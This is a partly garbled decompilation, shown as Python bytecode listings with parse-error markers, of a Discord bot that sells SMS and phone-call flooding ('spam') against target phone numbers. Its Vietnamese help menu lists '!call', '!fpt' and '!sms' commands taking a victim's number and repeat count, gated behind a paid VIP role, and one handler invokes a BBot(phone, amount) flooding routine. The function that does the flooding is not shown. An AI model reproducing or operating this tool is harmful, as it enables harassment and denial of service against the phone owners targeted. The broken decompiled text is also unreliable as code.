               88  LOAD_STR                 '```'
               90  LOAD_FAST                'amount'
               92  FORMAT_VALUE          0  ''
               94  LOAD_STR                 '```'
               96  BUILD_STRING_3        3 
               98  LOAD_CONST               ('name', 'value')
              100  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              102  POP_TOP          

 L. 262       104  LOAD_FAST                'embes'
              106  LOAD_ATTR                add_field
              108  LOAD_STR                 '**TYPE**'
              110  LOAD_STR                 '```Sms & Momo```'
              112  LOAD_CONST               ('name', 'value')
              114  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              116  POP_TOP          

 L. 263       118  LOAD_FAST                'embes'
              120  LOAD_ATTR                add_field
              122  LOAD_STR                 '**STATUS**'
              124  LOAD_STR                 '```Success```'
              126  LOAD_CONST               ('name', 'value')
              128  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              130  POP_TOP          

 L. 264       132  BUILD_LIST_0          0 
              134  LOAD_CONST               ('https://media.giphy.com/media/v6VWVHLsu34p0IH3RP/giphy.gif', 'https://media.giphy.com/media/mP1ohhP1qcBeZSHCf6/giphy.gif', 'https://media.giphy.com/media/6jUaX1Jd2Xrbffw9Gu/giphy.gif', 'https://media.giphy.com/media/jz62qtaMLe4xTiOO3L/giphy.gif', 'https://media.giphy.com/media/Aug3566Gn8DKFD1aZy/giphy.gif', 'https://media.giphy.com/media/vfSr2UMdz9pGTVqxaT/giphy.gif', 'https://media.giphy.com/media/E8hb9k7LvSCcHqwlxP/giphy.gif', 'https://media.giphy.com/media/GhOYgvCWeNUUUrGNoW/giphy.gif', 'https://media.giphy.com/media/STJKDPDiEQAW7BPXxp/giphy.gif', 'https://media.giphy.com/media/ItKyU9yIWI5MfpCZmI/giphy.gif')
              136  CALL_FINALLY        139  'to 139'
              138  STORE_FAST               'ca'

 L. 265       140  LOAD_GLOBAL              random
              142  LOAD_METHOD              choice
              144  LOAD_FAST                'ca'
              146  CALL_METHOD_1         1  ''
              148  STORE_FAST               'rd1'

 L. 266       150  LOAD_FAST                'embes'
              152  LOAD_ATTR                set_image
              154  LOAD_FAST                'rd1'
              156  LOAD_CONST               ('url',)
              158  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              160  POP_TOP          

 L. 267       162  LOAD_FAST                'embes'
              164  LOAD_ATTR                set_footer
              166  LOAD_CONST               u'\xa9 Developer : Tr\u01b0\u1eddng#0001 | Requests By '
              168  LOAD_FAST                'ctx'
              170  LOAD_ATTR                author
              172  LOAD_ATTR                name
              174  FORMAT_VALUE          0  ''
              176  BUILD_STRING_2        2 
              178  LOAD_CONST               ('text',)
              180  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              182  POP_TOP          

 L. 268       184  LOAD_FAST                'ctx'
              186  LOAD_ATTR                channel
              188  LOAD_ATTR                send
              190  LOAD_FAST                'embes'
              192  LOAD_CONST               ('embed',)
              194  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              196  GET_AWAITABLE    
              198  LOAD_CONST               None
              200  YIELD_FROM       
              202  POP_TOP          

 L. 270       204  LOAD_GLOBAL              BBot
              206  LOAD_FAST                'phone'
              208  LOAD_FAST                'amount'
              210  CALL_FUNCTION_2       2  ''
              212  POP_TOP          
              214  LOAD_CONST               None
              216  RETURN_VALUE     

 L. 275       218  LOAD_GLOBAL              discord
              220  LOAD_ATTR                Embed
              222  LOAD_CONST               u'\U0001f680 *\U0001d649\U0001d65c\U0001d66a\U0001d66e\U0001d65a\u0302\u0303\U0001d663 \U0001d653\U0001d66a\U0001d656\u0302\U0001d663 \U0001d64f\U0001d667\U0001d66a\u031b\U0001d664\u031b\u0300\U0001d663\U0001d65c* \U0001f680'
              224  LOAD_CONST               16711680
              226  LOAD_CONST               ('title', 'color')
              228  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              230  STORE_FAST               'embent'

 L. 277       232  LOAD_FAST                'embent'
              234  LOAD_ATTR                add_field
              236  LOAD_STR                 '**WARNING**'
              238  LOAD_CONST               u'`Spam Max 100 Th\xf4i Nh\xe9 !!!`'
              240  LOAD_CONST               ('name', 'value')
              242  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              244  POP_TOP          

 L. 278       246  LOAD_FAST                'embent'
              248  LOAD_ATTR                set_footer
              250  LOAD_CONST               u'\xa9 Developer : Tr\u01b0\u1eddng#0001 | Warning '
              252  LOAD_FAST                'ctx'
              254  LOAD_ATTR                author
              256  LOAD_ATTR                name
              258  FORMAT_VALUE          0  ''
              260  LOAD_STR                 ' !!!'
              262  BUILD_STRING_3        3 
              264  LOAD_CONST               ('text',)
              266  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              268  POP_TOP          

 L. 279       270  LOAD_FAST                'ctx'
              272  LOAD_ATTR                reply
              274  LOAD_FAST                'embent'
              276  LOAD_CONST               ('embed',)
              278  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              280  GET_AWAITABLE    
              282  LOAD_CONST               None
              284  YIELD_FROM       
              286  POP_TOP          

Parse error at or near `None' instruction at offset -1


@bot.command()
async def help--- This code section failed: ---

 L. 420         0  <129>                 1  ''

 L. 292         2  LOAD_GLOBAL              discord
                4  LOAD_ATTR                Embed
                6  LOAD_CONST               u'\U0001f680 *\U0001d649\U0001d65c\U0001d66a\U0001d66e\U0001d65a\u0302\u0303\U0001d663 \U0001d653\U0001d66a\U0001d656\u0302\U0001d663 \U0001d64f\U0001d667\U0001d66a\u031b\U0001d664\u031b\u0300\U0001d663\U0001d65c* \U0001f680'
                8  LOAD_CONST               u'\u2728 **HELP MENU** \u2728'
               10  LOAD_GLOBAL              discord
               12  LOAD_ATTR                Colour
               14  LOAD_METHOD              random
               16  CALL_METHOD_0         0  ''
               18  LOAD_CONST               ('title', 'description', 'color')
               20  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               22  STORE_FAST               'emBed'

 L. 294        24  LOAD_FAST                'emBed'
               26  LOAD_ATTR                add_field
               28  LOAD_STR                 '**CALL BETA Spammer**'
               30  LOAD_STR                 '`!call [phone] 1`'
               32  LOAD_CONST               ('name', 'value')
               34  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               36  POP_TOP          

 L. 295        38  LOAD_FAST                'emBed'
               40  LOAD_ATTR                add_field
               42  LOAD_STR                 '**FPT Spammer**'
               44  LOAD_STR                 '`!fpt [phone] [amount]`'
               46  LOAD_CONST               ('name', 'value')
               48  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               50  POP_TOP          

 L. 296        52  LOAD_FAST                'emBed'
               54  LOAD_ATTR                add_field
               56  LOAD_STR                 '**SMS Spammer**'
               58  LOAD_STR                 '`!sms [phone] [amount]`'
               60  LOAD_CONST               ('name', 'value')
               62  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               64  POP_TOP          

 L. 297        66  LOAD_FAST                'emBed'
               68  LOAD_ATTR                add_field
               70  LOAD_STR                 '**Warning**'
               72  LOAD_CONST               u'`\u2022 Ph\u1ea3i C\xf3 Role @vip buy\n\u2022 B\u1ecf S\u1ed1 0 \u1edf \u0110\u1ea7u S\u1ed1 \u0110i\u1ec7n Tho\u1ea1i\n\u2022 phone : s\u1ed1 \u0111i\u1ec7n tho\u1ea1i mu\u1ed1n spam\n\u2022 amount : s\u1ed1 l\u1ea7n spam\n\u2022 Spam T\u1ed1i \u0110a 100/1 L\u1ea7n`'
               74  LOAD_CONST               ('name', 'value')
               76  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               78  POP_TOP          

 L. 298        80  LOAD_FAST                'emBed'
               82  LOAD_ATTR                set_footer
               84  LOAD_CONST               u'\xa9 Developer : Tr\u01b0\u1eddng#0001 | Requests By '
               86  LOAD_FAST                'ctx'
               88  LOAD_ATTR                author
               90  LOAD_ATTR                name
               92  FORMAT_VALUE          0  ''
               94  BUILD_STRING_2        2 
               96  LOAD_CONST               ('text',)
               98  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              100  POP_TOP          

 L. 299       102  LOAD_FAST                'ctx'
              104  LOAD_ATTR                channel
              106  LOAD_ATTR                send
              108  LOAD_FAST                'emBed'
              110  LOAD_CONST               ('embed',)
              112  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              114  GET_AWAITABLE    
              116  LOAD_CONST               None
              118  YIELD_FROM       
              120  POP_TOP          

Parse error at or near `None' instruction at offset -1


bot.run(token)
